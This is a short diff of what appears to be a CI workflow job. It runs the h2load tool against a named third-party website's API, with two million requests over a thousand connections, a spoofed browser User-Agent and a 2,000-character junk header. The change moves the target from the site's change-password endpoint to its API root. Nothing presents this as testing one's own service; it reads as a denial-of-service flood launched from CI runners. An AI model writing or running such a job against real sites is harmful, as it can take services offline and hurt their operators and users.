@@ -17,4 +17,4 @@ jobs:
           h2load -n 2000000 -c 1000 -m 100 -t 8 \
           -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.0.0" \
           -H "X-Garbage: $(python3 -c 'print("A"*2000)')" \
-          https://fmobile.rpscampus.in/api/changepassword
+          https://fmobile.rpscampus.in/api/
